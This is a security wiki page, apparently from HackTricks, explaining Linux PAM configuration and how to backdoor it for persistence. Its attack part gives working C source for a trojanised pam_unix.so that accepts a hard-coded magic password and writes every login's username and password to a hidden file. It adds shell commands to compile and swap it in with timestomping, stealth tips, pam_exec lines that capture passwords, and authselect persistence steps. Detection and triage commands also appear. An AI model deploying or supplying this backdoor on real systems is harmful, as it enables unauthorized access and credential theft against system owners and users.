# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Basic Information

**PAM (Pluggable Authentication Modules)** acts as a security mechanism that **verifies the identity of users attempting to access computer services**, controlling their access based on various criteria. It's akin to a digital gatekeeper, ensuring that only authorized users can engage with specific services while potentially limiting their usage to prevent system overloads.

#### Configuration Files

- **Solaris** supports the legacy central file `/etc/pam.conf`, but current guidance prefers service files under `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux systems** prefer a directory approach, storing service-specific configurations within `/etc/pam.d`. For instance, the configuration file for the login service is found at `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

An example of a PAM configuration for the login service might look like this:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM Management Realms**

These realms, or management groups, include **auth**, **account**, **password**, and **session**, each responsible for different aspects of the authentication and session management process:<sup>[[1]](#references)</sup>

- **Auth**: Validates user identity, often by prompting for a password.
- **Account**: Handles account verification, checking for conditions like group membership or time-of-day restrictions.
- **Password**: Manages password updates, including complexity checks or dictionary attacks prevention.
- **Session**: Manages actions during the start or end of a service session, such as mounting directories or setting resource limits.

#### **PAM Module Controls**

Controls dictate the module's response to success or failure, influencing the overall authentication process. These include:<sup>[[1]](#references)</sup>

- **Required**: Failure of a required module results in eventual failure, but only after all subsequent modules are checked.
- **Requisite**: Immediate termination of the process upon failure.
- **Sufficient**: If no earlier `required` module failed, success returns immediately and skips the remaining modules in the same management group.
- **Optional**: Only causes failure if it's the sole module in the stack.

#### Offensive Semantics That Matter

When analyzing or modifying PAM, the **location of an inserted rule** determines which stack sees it:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` and `substack` pull rules from other files, so editing `sshd` might only affect SSH while editing `system-auth`, `common-auth`, or another shared stack affects several services at once.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM also supports bracketed controls such as `[success=1 default=ignore]`. These can be abused to **skip one or more modules** after a successful custom check instead of visibly replacing `pam_unix.so`.<sup>[[1]](#references)</sup>
- The `module-path` can be **absolute** (`/usr/lib/security/pam_custom.so`) or **relative** to the default PAM module directory. On modern Linux systems the real directories are often `/lib/security`, `/lib64/security`, `/usr/lib/security`, or multiarch paths like `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Quick operator takeaway: always map the **full service graph** before patching. For example, `sshd -> password-auth -> system-auth` on some distros or `sshd -> system-remote-login -> system-login -> system-auth` on others means the same one-line implant may fan out much wider than intended.<sup>[[1]](#references)[[13]](#references)</sup>

#### Example Scenario

In a setup with multiple auth modules, the process follows a strict order. If the `pam_securetty` module finds the login terminal unauthorized, root logins are blocked, yet all modules are still processed due to its "required" status. The `pam_env` sets environment variables, potentially aiding in user experience. The `pam_ldap` and `pam_unix` modules work together to authenticate the user, with `pam_unix` attempting to use a previously supplied password, enhancing efficiency and flexibility in authentication methods.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

A classic persistence trick in high-value Linux environments is to **swap the legitimate PAM library with a trojanised drop-in**. On a host whose PAM stack loads `pam_unix.so`, SSH or console authentication can invoke its `pam_sm_authenticate()` entry point; a malicious replacement can capture credentials or implement a *magic* password bypass.<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation Cheatsheet
The sketch below uses Linux-PAM's `pam_sm_authenticate()` service entry point and `pam_get_authtok()` to access the authentication token.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Compile and stealth-replace (the replacement/timestomp pattern is documented by Unit 42). Adjust both the backup path hard-coded in the wrapper and the commands below to the target's actual PAM module directory:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec Tips
1. **Atomic overwrite** – write a complete library to a temporary file and rename it into place to avoid leaving a partially written authentication module.
2. A path such as `/usr/bin/.dbus.log` was observed in Unit 42's AuthDoor analysis, so it is also a useful hunting indicator.<sup>[[2]](#references)</sup>
3. Preserve the entry points expected by the PAM stack (for example, `pam_sm_authenticate` and `pam_sm_setcred`) so other management operations continue to work.<sup>[[11]](#references)[[18]](#references)</sup>

### Detection
For package-integrity checks, RPM verifies installed-file metadata, `debsums -s` reports checksum errors, and `dpkg -S` in the triage block queries package ownership; the audit watch syntax records writes and attribute changes to a path.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Compare MD5/SHA256 of `pam_unix.so` against distro package.
* `rpm -V pam` or `debsums -s libpam-modules` to spot replaced libraries without manual hashing.
* Check for world-writable or unusual ownership under `/lib/security/`.
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Grep PAM configs for unexpected modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Quick triage commands (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Abusing `pam_exec` for persistence
Instead of replacing `pam_unix.so`, a lighter touch is to append a `pam_exec` line in `/etc/pam.d/sshd` so an invocation that reaches that PAM line runs a helper while leaving the normal stack intact.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` receives PAM metadata in environment variables such as `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, and `PAM_TYPE`. With `expose_authtok`, the helper can read up to `PAM_MAX_RESP_SIZE` bytes of the password from `stdin` during `auth` or `password` phases. If you want the helper to run with the effective UID instead of the real UID, add `seteuid`.<sup>[[4]](#references)</sup>

Practical notes follow the module types and `type=` filter documented for `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` is better for **post-login actions** such as re-opening sockets or spawning a detached daemon.
- `auth optional pam_exec.so quiet expose_authtok ...` is the usual choice for **credential capture** because it runs before the session opens.
- `type=session` or `type=auth` can be used to constrain execution to a specific PAM phase and avoid noisy double execution.

### Surviving distro tooling: `authselect`

On RHEL and Fedora-family systems that use `authselect`, direct edits to generated files such as `/etc/pam.d/system-auth` or `/etc/pam.d/password-auth` may be **overwritten by `authselect`**. For persistence, operators often patch the active custom profile under `/etc/authselect/custom/<profile>/` and then re-select it.<sup>[[5]](#references)[[19]](#references)</sup>

Typical workflow when you have root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

This matters for both offense and triage: if `/etc/pam.d/system-auth` contains the banner `Generated by authselect` and `Do not modify this file manually`, then the real persistence point may live under `/etc/authselect/custom/` rather than in `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Recent tradecraft seen in the wild

Recent 2025 reporting on the **Plague** Linux backdoor showed the same core idea taken further: a malicious PAM component with a **static bypass password**, plus cleanup of SSH-related environment variables and shell history (`HISTFILE=/dev/null`) to reduce session traces after login.<sup>[[3]](#references)</sup> That is a useful hunting pattern because the backdoor logic may live in PAM while the stealth artifacts only appear **after** authentication succeeds.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [The Covert Operator's Playbook: Infiltration of Global Telecom Networks - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM Manual](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Configuring user authentication using authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux manual page](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Managing Authentication in Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM Manual](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM Manual](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [System-Level Authentication Guide - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu package file list: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM Manual](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM Manual](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM Manual](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Changes/Make Authselect Mandatory - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)

{{#include ../../banners/hacktricks-training.md}}
